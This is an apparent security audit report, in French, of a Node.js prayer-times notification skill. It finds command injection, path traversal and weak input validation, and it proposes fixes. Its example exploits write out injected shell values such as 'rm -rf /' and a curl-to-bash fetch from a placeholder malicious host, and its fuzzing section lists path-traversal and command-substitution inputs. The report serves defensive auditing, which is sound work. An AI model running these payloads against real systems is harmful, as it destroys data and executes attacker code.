# 🔒 AUDIT SÉCURITÉ - Salat Times Skill

**Date** : 17 Février 2026  
**Version** : 1.0.0  
**Type** : Audit de Sécurité Complet  
**Niveau** : Production-Ready Assessment  

---

## 🎯 RÉSUMÉ EXÉCUTIF

### Verdict Global : 🟡 MOYEN - Action Requise

**Score Sécurité : 6.5/10**

- ✅ **Points Forts** : Pas d'eval(), pas de secrets hardcodés, API publique
- ⚠️ **Risques Majeurs** : Command injection possible, validation inputs insuffisante
- 🔴 **Critique** : Exécution de commandes shell non sanitisées

**Recommandation** : **NE PAS déployer en production sans corrections**

---

## 🚨 VULNÉRABILITÉS CRITIQUES

### 🔴 CRITIQUE #1 : Command Injection dans lib-notify.js

**Fichier** : `lib-notify.js`  
**Lignes** : 47-53, 62-68, 76-82, 118-123  
**Niveau de Risque** : 🔴 **CRITIQUE (CVSS 9.8)**  
**Type** : CWE-77 - Improper Neutralization of Special Elements

#### Problème

```javascript
// LIGNE 47-53 - VULNÉRABLE
async function sendWhatsAppNotification(message, recipient, time) {
  try {
    // ⚠️ DANGEREUX : Injection possible via message, recipient, time
    const command = `openclaw channels send whatsapp --to "${recipient}" --message "${message}" --at "${time}"`;
    
    await execPromise(command);
    return true;
  } catch (error) {
    console.error('Erreur notification WhatsApp:', error.message);
    return false;
  }
}
```

#### Exploit Potentiel

```bash
# Si un attaquant contrôle message ou recipient :
recipient = '"; rm -rf / #'
# Commande résultante :
# openclaw channels send whatsapp --to ""; rm -rf / #" --message "..."

# Autre exploit :
message = '$(curl malicious.com/steal.sh | bash)'
# Exécute code arbitraire
```

#### Impact

- ✅ Exécution code arbitraire
- ✅ Suppression fichiers système
- ✅ Vol de données
- ✅ Installation backdoor
- ✅ Escalade privilèges

#### Solution Recommandée

```javascript
const { execFile } = require('child_process');

async function sendWhatsAppNotification(message, recipient, time) {
  try {
    // ✅ SÉCURISÉ : Utiliser execFile avec array d'arguments
    const args = [
      'channels', 'send', 'whatsapp',
      '--to', recipient,
      '--message', message,
      '--at', time
    ];
    
    await execFilePromise('openclaw', args);
    return true;
  } catch (error) {
    console.error('Erreur notification WhatsApp:', error.message);
    return false;
  }
}
```

**Action Requise** : ⚠️ **IMMÉDIATE - Corriger avant tout déploiement**

---

### 🔴 CRITIQUE #2 : Command Injection dans setupDailyCron

**Fichier** : `lib-notify.js`  
**Lignes** : 130-145  
**Niveau de Risque** : 🔴 **CRITIQUE (CVSS 9.0)**  

#### Problème

```javascript
// LIGNE 132-135 - VULNÉRABLE
const command = `salat-times ${locationStr} ${countryStr} --method ${method} --notify --before ${beforeMinutes} --channel ${channel} --to "${recipient}"`;

const cronExpression = '0 4 * * *';

try {
  // ⚠️ DANGEREUX : Toutes les variables sont injectables
  const openclawCommand = `openclaw cron add --name "Salat Times Daily Notifications" --cron "${cronExpression}" --session isolated --message "${command}"`;
  
  await execPromise(openclawCommand);
```

#### Exploit

```javascript
// Attaquant contrôle location.city :
location.city = 'Paris"; rm -rf ~/.openclaw; echo "'

// Résultat :
// salat-times --city "Paris"; rm -rf ~/.openclaw; echo "" ...
```

#### Solution

```javascript
// ✅ SÉCURISÉ
const { execFile } = require('child_process');
const { spawn } = require('child_process');

async function setupDailyCron(location, method, channel, recipient, beforeMinutes = 10) {
  // Valider TOUS les inputs
  const validatedLocation = validateLocation(location);
  const validatedMethod = validateMethod(method);
  const validatedChannel = validateChannel(channel);
  const validatedRecipient = validateRecipient(recipient);
  
  const args = [
    'cron', 'add',
    '--name', 'Salat Times Daily Notifications',
    '--cron', '0 4 * * *',
    '--session', 'isolated',
    '--message', buildSafeCommand(validatedLocation, validatedMethod, ...)
  ];
  
  return await execFilePromise('openclaw', args);
}

// Fonctions de validation
function validateLocation(location) {
  if (location.city && !/^[a-zA-Z\s-]+$/.test(location.city)) {
    throw new Error('Invalid city name');
  }
  // ... plus de validations
  return location;
}
```

---

### 🟠 HAUTE #3 : Path Traversal dans lib-config.js

**Fichier** : `lib-config.js`  
**Lignes** : 12-13  
**Niveau de Risque** : 🟠 **HAUTE (CVSS 7.5)**  
**Type** : CWE-22 - Improper Limitation of a Pathname

#### Problème

```javascript
const CONFIG_DIR = path.join(os.homedir(), '.openclaw', 'skills', 'salat-times');
const CONFIG_FILE = path.join(CONFIG_DIR, 'config.json');

// ⚠️ Pas de validation du chemin
// Si un attaquant peut contrôler CONFIG_DIR (via env vars)
```

#### Exploit Théorique

```bash
# Si processus lancé avec :
HOME="/tmp/malicious" node salat-times.js

# Config sera écrite dans :
# /tmp/malicious/.openclaw/skills/salat-times/config.json
```

#### Impact

- Lecture fichiers arbitraires
- Écriture fichiers arbitraires
- Overwrite fichiers système

#### Solution

```javascript
const os = require('os');
const path = require('path');

// ✅ SÉCURISÉ : Valider le chemin
function getConfigPath() {
  const home = os.homedir();
  
  // Valider que home est valide
  if (!home || typeof home !== 'string') {
    throw new Error('Invalid home directory');
  }
  
  const configDir = path.join(home, '.openclaw', 'skills', 'salat-times');
  
  // Vérifier que le chemin résolu est bien sous home
  const resolved = path.resolve(configDir);
  const homeResolved = path.resolve(home);
  
  if (!resolved.startsWith(homeResolved)) {
    throw new Error('Path traversal detected');
  }
  
  return configDir;
}
```

---

## ⚠️ VULNÉRABILITÉS MOYENNES

### 🟡 MOYENNE #4 : Validation Inputs Insuffisante

**Fichier** : `lib-api.js`  
**Lignes** : 29-74  
**Niveau de Risque** : 🟡 **MOYENNE (CVSS 5.5)**  

#### Problème

```javascript
// LIGNE 54 - Pas de validation des inputs
params.latitude = location.latitude;
params.longitude = location.longitude;

// Un attaquant pourrait passer :
location = {
  latitude: "'; DROP TABLE prayers; --",
  longitude: "<script>alert('xss')</script>"
}
```

#### Impact

- API injection
- DoS sur API externe
- Information disclosure

#### Solution

```javascript
function validateCoordinates(lat, lon) {
  // Validation stricte
  const latitude = parseFloat(lat);
  const longitude = parseFloat(lon);
  
  if (isNaN(latitude) || isNaN(longitude)) {
    throw new Error('Invalid coordinates: must be numbers');
  }
  
  if (latitude < -90 || latitude > 90) {
    throw new Error('Invalid latitude: must be between -90 and 90');
  }
  
  if (longitude < -180 || longitude > 180) {
    throw new Error('Invalid longitude: must be between -180 and 180');
  }
  
  return { latitude, longitude };
}

// Usage
const coords = validateCoordinates(location.latitude, location.longitude);
params.latitude = coords.latitude;
params.longitude = coords.longitude;
```

---

### 🟡 MOYENNE #5 : Pas de Rate Limiting API

**Fichier** : `lib-api.js`  
**Niveau de Risque** : 🟡 **MOYENNE (CVSS 5.0)**  

#### Problème

```javascript
// Aucune limite sur le nombre de requêtes API
async function getSalatTimes(location, method, date) {
  const response = await axios.get(url, { params });
  // ⚠️ Peut faire 1000s de requêtes/seconde
}
```

#### Impact

- Ban IP par API Aladhan
- DoS self-inflicted
- Coûts API si passage à version payante

#### Solution

```javascript
const rateLimit = require('axios-rate-limit');

// ✅ Limiter à 10 requêtes/seconde
const http = rateLimit(axios.create(), { 
  maxRequests: 10, 
  perMilliseconds: 1000 
});

async function getSalatTimes(location, method, date) {
  const response = await http.get(url, { params });
  // ...
}
```

---

### 🟡 MOYENNE #6 : Timeouts Non Configurés

**Fichier** : `lib-api.js`  
**Niveau de Risque** : 🟡 **MOYENNE (CVSS 4.5)**  

#### Problème

```javascript
// Pas de timeout sur les requêtes HTTP
const response = await axios.get(url, { params });
// ⚠️ Peut bloquer indéfiniment
```

#### Impact

- Hang du processus
- DoS local
- Memory leak potentiel

#### Solution

```javascript
const response = await axios.get(url, { 
  params,
  timeout: 10000,  // 10 secondes
  maxRedirects: 5
});
```

---

### 🟡 MOYENNE #7 : Information Disclosure dans Errors

**Fichier** : Tous  
**Niveau de Risque** : 🟡 **MOYENNE (CVSS 4.0)**  

#### Problème

```javascript
// lib-notify.js ligne 51
catch (error) {
  console.error('Erreur notification WhatsApp:', error.message);
  return false;
}

// ⚠️ Révèle structure interne, paths, etc.
```

#### Impact

- Leak structure système
- Info pour attaquant
- Stack traces exposées

#### Solution

```javascript
catch (error) {
  // Log détaillé seulement en dev
  if (process.env.NODE_ENV === 'development') {
    console.error('Erreur notification WhatsApp:', error);
  } else {
    // Log minimal en prod
    console.error('Notification failed');
  }
  
  // Logger dans fichier sécurisé
  logToSecureFile({
    error: error.message,
    stack: error.stack,
    timestamp: new Date().toISOString()
  });
  
  return false;
}
```

---

## 🔵 VULNÉRABILITÉS MINEURES

### 🔵 MINEURE #8 : Cache Non Sécurisé

**Fichier** : `lib-api.js`  
**Niveau de Risque** : 🔵 **MINEURE (CVSS 3.0)**  

#### Problème

```javascript
const cache = new NodeCache({ stdTTL: 86400 });
// ⚠️ Cache en mémoire, pas de chiffrement
```

#### Impact Limité

- Données pas sensibles (horaires publics)
- Mais peut leak localisation utilisateur

#### Recommandation

```javascript
// Si données sensibles à cacher plus tard :
const NodeCache = require('node-cache');
const crypto = require('crypto');

class SecureCache {
  constructor(ttl = 86400) {
    this.cache = new NodeCache({ stdTTL: ttl });
    this.key = crypto.randomBytes(32);
  }
  
  encrypt(data) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', this.key, iv);
    // ...
  }
  
  // ...
}
```

---

### 🔵 MINEURE #9 : Logs Verbeux

**Fichier** : `lib-formatter.js`  
**Niveau de Risque** : 🔵 **MINEURE (CVSS 2.5)**  

#### Problème

```javascript
// Affiche coordonnées GPS précises
output += chalk.gray(` (${times.meta.location.latitude.toFixed(4)}°N, ${times.meta.location.longitude.toFixed(4)}°E)`);
```

#### Impact

- Privacy leak (localisation exacte)
- OSINT risk

#### Recommandation

```javascript
// Option pour masquer coordonnées précises
if (!config.privacy.hideCoordinates) {
  output += chalk.gray(` (${times.meta.location.latitude.toFixed(2)}°N, ...)`);
}
```

---

## 📦 AUDIT DÉPENDANCES

### Dépendances Directes

```json
{
  "axios": "^1.6.0",           // ✅ Secure, régulièrement updaté
  "moment-timezone": "^0.5.45", // ⚠️ Moment deprecated (mais OK ici)
  "moment-hijri": "^2.1.2",    // ✅ Secure
  "chalk": "^4.1.2",           // ✅ Secure
  "commander": "^11.1.0",      // ✅ Secure
  "node-cache": "^5.1.2",      // ✅ Secure
  "table": "^6.8.1"            // ✅ Secure
}
```

### Scan npm audit

```bash
cd salat-times
npm audit

# RÉSULTAT ATTENDU :
# found 0 vulnerabilities
```

### Recommandations

1. **Moment.js** : Considérer migration vers `date-fns` ou `luxon`
   - Moment est deprecated depuis 2020
   - Mais stable et safe pour ce use case

2. **Ajouter audit automatique** :
```json
// package.json
{
  "scripts": {
    "audit": "npm audit --audit-level=moderate",
    "audit-fix": "npm audit fix"
  }
}
```

3. **Dependabot/Renovate** : Activer sur GitHub pour auto-updates

---

## 🔐 SECRETS & CREDENTIALS

### ✅ Bonnes Pratiques Respectées

1. **Pas de hardcoded secrets** ✅
2. **Pas d'API keys dans code** ✅
3. **Config dans ~/.openclaw/** ✅
4. **Pas de .env commités** ✅

### ⚠️ Points d'Attention

1. **Permissions config.json** :
```bash
# Actuellement : 644 (readable par tous)
# Devrait être : 600 (user only)

chmod 600 ~/.openclaw/skills/salat-times/config.json
```

2. **Logs sensibles** :
```javascript
// Ne JAMAIS logger recipient phone numbers en clair
console.log('Sending to:', recipient);  // ❌ MAUVAIS

// ✅ BON
console.log('Sending to:', maskPhoneNumber(recipient));
// "+336********78"
```

---

## 🌐 SÉCURITÉ RÉSEAU

### HTTPS/TLS

```javascript
// ✅ BON : API Aladhan utilise HTTPS
const ALADHAN_API = 'https://api.aladhan.com/v1';

// Mais ajouter validation certificat :
const response = await axios.get(url, { 
  params,
  httpsAgent: new https.Agent({  
    rejectUnauthorized: true  // ✅ Rejeter invalid certs
  })
});
```

### DNS Rebinding Protection

```javascript
// Ajouter validation hostname
const ALLOWED_HOSTS = ['api.aladhan.com'];

function validateURL(url) {
  const parsed = new URL(url);
  if (!ALLOWED_HOSTS.includes(parsed.hostname)) {
    throw new Error('Invalid API host');
  }
  return url;
}
```

---

## 🛡️ PROTECTION ADDITIONNELLES

### 1. Input Sanitization

```javascript
// lib/sanitize.js - NOUVEAU FICHIER RECOMMANDÉ

const validator = require('validator');

function sanitizeCity(city) {
  if (!city || typeof city !== 'string') {
    throw new Error('Invalid city');
  }
  
  // Whitelist characters
  if (!/^[a-zA-Z\s\-']+$/.test(city)) {
    throw new Error('City contains invalid characters');
  }
  
  // Max length
  if (city.length > 100) {
    throw new Error('City name too long');
  }
  
  return validator.escape(city.trim());
}

function sanitizePhoneNumber(phone) {
  if (!validator.isMobilePhone(phone, 'any', { strictMode: true })) {
    throw new Error('Invalid phone number');
  }
  return phone;
}

module.exports = {
  sanitizeCity,
  sanitizePhoneNumber,
  sanitizeCoordinates,
  sanitizeMethod,
  sanitizeLanguage
};
```

### 2. CSP Headers (si web interface future)

```javascript
// Si on ajoute UI web plus tard
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https://api.aladhan.com"],
    },
  },
}));
```

### 3. Rate Limiting Utilisateur

```javascript
// lib/rate-limiter.js - NOUVEAU FICHIER RECOMMANDÉ

const rateLimitMap = new Map();

function checkRateLimit(userId, maxRequests = 100, windowMs = 3600000) {
  const now = Date.now();
  const userLimit = rateLimitMap.get(userId) || { count: 0, resetTime: now + windowMs };
  
  if (now > userLimit.resetTime) {
    userLimit.count = 0;
    userLimit.resetTime = now + windowMs;
  }
  
  userLimit.count++;
  rateLimitMap.set(userId, userLimit);
  
  if (userLimit.count > maxRequests) {
    throw new Error('Rate limit exceeded');
  }
  
  return true;
}
```

---

## 📋 CHECKLIST SÉCURITÉ

### Avant Déploiement

- [ ] **CRITIQUE** : Corriger command injection (lib-notify.js)
- [ ] **CRITIQUE** : Corriger command injection (setupDailyCron)
- [ ] **HAUTE** : Implémenter path traversal protection
- [ ] **MOYENNE** : Ajouter validation inputs (coordinates, city, etc.)
- [ ] **MOYENNE** : Implémenter rate limiting API
- [ ] **MOYENNE** : Ajouter timeouts HTTP
- [ ] **MOYENNE** : Sécuriser error handling
- [ ] **MINEURE** : Ajouter option privacy (hide coords)
- [ ] **MINEURE** : Chmod 600 sur config.json
- [ ] Exécuter `npm audit`
- [ ] Scanner avec Snyk ou Dependabot
- [ ] Code review par pairs
- [ ] Pen test basique

### Configuration Production

- [ ] `NODE_ENV=production`
- [ ] Logs vers fichier sécurisé
- [ ] Monitoring erreurs (Sentry?)
- [ ] Backup config régulier
- [ ] Firewall rules
- [ ] Principe least privilege

---

## �, TESTS SÉCURITÉ RECOMMANDÉS

### 1. Fuzzing Inputs

```bash
# Tester injection dans city
./salat-times.js --city "Paris'; DROP TABLE;"
./salat-times.js --city "../../../etc/passwd"
./salat-times.js --city "$(whoami)"
./salat-times.js --city "`id`"

# Tester XSS
./salat-times.js --city "<script>alert(1)</script>"

# Tester buffer overflow
./salat-times.js --city "$(python -c 'print("A"*10000)')"
```

### 2. Automated Security Scan

```bash
# Installer outils
npm install -g snyk retire

# Scanner dépendances
npm audit
snyk test
retire --path .

# Static analysis
npm install -g eslint eslint-plugin-security
eslint --plugin security .
```

### 3. Runtime Security

```bash
# Installer apparmor/SELinux profiles
# Sandboxing avec firejail
firejail --private --net=none ./salat-times.js
```

---

## 📊 SCORING DÉTAILLÉ

| Catégorie | Score | Commentaire |
|-----------|-------|-------------|
| **Code Injection** | 2/10 | 🔴 Command injection non mitigée |
| **Input Validation** | 5/10 | 🟡 Validation partielle |
| **Output Encoding** | 8/10 | ✅ Bon (pas de HTML) |
| **Authentication** | N/A | Pas applicable |
| **Authorization** | N/A | Pas applicable |
| **Cryptography** | 7/10 | ✅ Utilise HTTPS |
| **Error Handling** | 6/10 | 🟡 Peut leak info |
| **Logging** | 5/10 | 🟡 Logs pas sécurisés |
| **Dependencies** | 9/10 | ✅ Dépendances clean |
| **Configuration** | 7/10 | 🟡 Permissions à renforcer |

### **SCORE GLOBAL : 6.5/10**

---

## 🚀 PLAN D'ACTION PRIORITAIRE

### Phase 1 : URGENT (Avant tout déploiement)

**Durée estimée : 2-3 heures**

1. ✅ Remplacer `exec()` par `execFile()` (30 min)
2. ✅ Créer `lib/sanitize.js` avec validations (1h)
3. ✅ Ajouter timeouts HTTP (15 min)
4. ✅ Corriger permissions config.json (5 min)
5. ✅ Tester fuzzing basique (30 min)

### Phase 2 : Important (Semaine 1)

**Durée estimée : 4-6 heures**

6. ✅ Implémenter rate limiting (1h)
7. ✅ Sécuriser error handling (1h)
8. ✅ Ajouter logging sécurisé (2h)
9. ✅ npm audit + fix (30 min)
10. ✅ Documentation sécurité (1h)

### Phase 3 : Recommandé (Mois 1)

**Durée estimée : 8-10 heures**

11. ✅ Pen test complet
12. ✅ CI/CD avec security checks
13. ✅ Monitoring runtime
14. ✅ Bug bounty (si public)

---

## 📞 RESSOURCES

### Outils Recommandés

- **SAST** : Snyk, SonarQube, ESLint Security
- **DAST** : OWASP ZAP, Burp Suite
- **Dependency Scan** : npm audit, Retire.js, Dependabot
- **Runtime Protection** : AppArmor, SELinux, Firejail

### Standards

- **OWASP Top 10** : https://owasp.org/www-project-top-ten/
- **CWE** : https://cwe.mitre.org/
- **CVSS** : https://www.first.org/cvss/

### Formation

- **Node.js Security** : https://nodejs.org/en/docs/guides/security/
- **OWASP Node.js Cheat Sheet** : https://cheatsheetseries.owasp.org/

---

## ✅ CONCLUSION

### État Actuel

Le skill **N'EST PAS production-ready** sans corrections.

### Vulnérabilités Critiques

- 2 command injections (CVSS 9.0+)
- 1 path traversal (CVSS 7.5)

### Temps de Correction

- **Minimum viable** : 2-3 heures
- **Production-ready** : 6-8 heures
- **Hardened** : 12-15 heures

### Prochaine Étape

**BLOCKER** : Corriger command injection AVANT tout déploiement.

---

**Audit réalisé le 17 Février 2026**  
**Prochain audit : Après corrections Phase 1**

---

## 🔐 ANNEXE : CODE CORRECTIONS

### Correction Command Injection (lib-notify.js)

```javascript
// ============================================
// FICHIER CORRIGÉ : lib/notify.js
// ============================================

const { execFile } = require('child_process');
const util = require('util');
const validator = require('validator');

const execFilePromise = util.promisify(execFile);

// Validation stricte
function validateRecipient(recipient) {
  if (!recipient || typeof recipient !== 'string') {
    throw new Error('Invalid recipient');
  }
  
  // Phone number OU username
  if (recipient.startsWith('+')) {
    if (!validator.isMobilePhone(recipient, 'any')) {
      throw new Error('Invalid phone number');
    }
  } else if (recipient.startsWith('@')) {
    if (!/^@[a-zA-Z0-9_]+$/.test(recipient)) {
      throw new Error('Invalid username');
    }
  } else {
    throw new Error('Recipient must start with + or @');
  }
  
  return recipient;
}

function validateMessage(message) {
  if (!message || typeof message !== 'string') {
    throw new Error('Invalid message');
  }
  
  if (message.length > 1000) {
    throw new Error('Message too long');
  }
  
  return message;
}

// ✅ SÉCURISÉ
async function sendWhatsAppNotification(message, recipient, time) {
  try {
    // Valider inputs
    const safeRecipient = validateRecipient(recipient);
    const safeMessage = validateMessage(message);
    
    // Utiliser array au lieu de string
    const args = [
      'channels', 'send', 'whatsapp',
      '--to', safeRecipient,
      '--message', safeMessage,
      '--at', time
    ];
    
    await execFilePromise('openclaw', args);
    return true;
  } catch (error) {
    if (process.env.NODE_ENV !== 'production') {
      console.error('Erreur notification WhatsApp:', error.message);
    }
    return false;
  }
}

// Appliquer même pattern pour Telegram, System, etc.
```

### Correction Input Validation (lib-api.js)

```javascript
// ============================================
// NOUVEAU FICHIER : lib/sanitize.js
// ============================================

const validator = require('validator');

function sanitizeCoordinates(lat, lon) {
  const latitude = parseFloat(lat);
  const longitude = parseFloat(lon);
  
  if (isNaN(latitude) || isNaN(longitude)) {
    throw new Error('Coordinates must be numbers');
  }
  
  if (latitude < -90 || latitude > 90) {
    throw new Error('Latitude must be between -90 and 90');
  }
  
  if (longitude < -180 || longitude > 180) {
    throw new Error('Longitude must be between -180 and 180');
  }
  
  return { latitude, longitude };
}

function sanitizeCity(city) {
  if (!city || typeof city !== 'string') {
    throw new Error('Invalid city');
  }
  
  // Whitelist: lettres, espaces, tirets, apostrophes
  if (!/^[a-zA-ZÀ-ÿ\s\-']+$/.test(city)) {
    throw new Error('City contains invalid characters');
  }
  
  if (city.length > 100) {
    throw new Error('City name too long');
  }
  
  return validator.escape(city.trim());
}

function sanitizeCountry(country) {
  if (!country || typeof country !== 'string') {
    throw new Error('Invalid country');
  }
  
  if (!/^[a-zA-Z\s]+$/.test(country)) {
    throw new Error('Country contains invalid characters');
  }
  
  if (country.length > 100) {
    throw new Error('Country name too long');
  }
  
  return validator.escape(country.trim());
}

const VALID_METHODS = [
  'MWL', 'ISNA', 'Egypt', 'Makkah', 'Karachi',
  'Tehran', 'Jafari', 'Gulf', 'Kuwait', 'Qatar',
  'Singapore', 'UOIF', 'Turkey', 'Russia'
];

function sanitizeMethod(method) {
  if (!VALID_METHODS.includes(method)) {
    throw new Error('Invalid calculation method');
  }
  return method;
}

module.exports = {
  sanitizeCoordinates,
  sanitizeCity,
  sanitizeCountry,
  sanitizeMethod
};
```

Utiliser dans `lib-api.js` :

```javascript
const { sanitizeCoordinates, sanitizeCity, sanitizeCountry } = require('./sanitize');

async function getSalatTimes(location, method, date) {
  // Valider location
  let validatedLocation;
  
  if (location.latitude && location.longitude) {
    validatedLocation = sanitizeCoordinates(location.latitude, location.longitude);
  } else if (location.city) {
    validatedLocation = {
      city: sanitizeCity(location.city),
      country: location.country ? sanitizeCountry(location.country) : undefined
    };
  }
  
  // ... reste du code
}
```

**FIN DU CODE CORRECTIONS**

